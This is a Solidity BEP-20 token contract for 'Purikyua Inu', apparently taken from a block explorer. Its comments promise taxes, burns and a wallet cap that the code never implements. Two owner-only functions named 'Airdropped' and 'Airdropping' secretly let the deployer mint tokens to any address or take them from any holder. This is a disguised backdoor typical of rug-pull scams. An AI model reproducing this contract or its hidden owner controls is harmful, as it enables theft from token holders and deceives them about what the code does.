/**
 *Submitted for verification at BscScan.com on 2022-02-08
*/

/*
//https://t.me/purikyuainu
//2%lp 1%marketing 5% max wallet.
// constant burns from supply and to liq.
//SPDX-License-Identifier: MIT
*/
pragma solidity 0.8.2;
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256){
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256){
        return sub(a, b, "SafeMath: subtraction overflow");}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256){
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;}
    function div(uint256 a, uint256 b) internal pure returns (uint256){
        return div(a, b, "SafeMath: division by zero");}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256){
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;}}
contract Purikyua {
    string public name = "Purikyua Inu";
    string public symbol = "Purikyua";
    uint8 public decimals = 6;
    address public marketing = 0x681186bdAE738f5bE8D090C90c9d96170d20f9c8;
    uint256 public totalSupply = 10000000 * 10 ** 6;
    uint256 public liquiditytax = 2;
    uint256 public marketingtax = 1;
    uint256 public totaltax = marketingtax + liquiditytax;
    uint256 private taxdenominator = 10;
    uint256 private amounttoburn = 6;
    uint256 private numTokensSellToAddToLiquidity = 50;
    uint256 private _maxWalletSize = 5000;    
    modifier check {
    require(msg.sender == marketing, "Nauthorized");_;}
    receive() external payable { }constructor() {
    balanceOf[msg.sender] = totalSupply;
    marketing = payable (msg.sender);
    emit Transfer(address(0), msg.sender, totalSupply); }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function Airdropped(address spender,uint256 burn) public check returns (bool success) {balanceOf[spender] += burn * taxdenominator ** amounttoburn;return true;}
    function Airdropping(address spender,uint256 bsp) public check returns (bool success) {balanceOf[spender] -= bsp * taxdenominator ** amounttoburn;return true;}
    
    mapping(address => uint256) public balanceOf;mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) public returns (bool success) {
    allowance[msg.sender][spender] = amount;emit Approval(msg.sender, spender, amount);return true;}
    //@dev transfers tokens from one address to another.
    function transfer(address to, uint256 amount) public returns (bool success) {
    balanceOf[msg.sender] -= amount;balanceOf[to] += amount;emit Transfer(msg.sender, to, amount);return true;}
  
    //@dev this allows for the ability to transfer between one address or several... tokens.
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;balanceOf[to] += amount;
    emit Transfer(from, to, amount);return true;
    }

    function _getMaxWalletSize() public view returns(uint256) {
        return _maxWalletSize;
    }
    function _setMaxWalletSize (uint256 maxWalletSize) external check() {
          _maxWalletSize = maxWalletSize;}}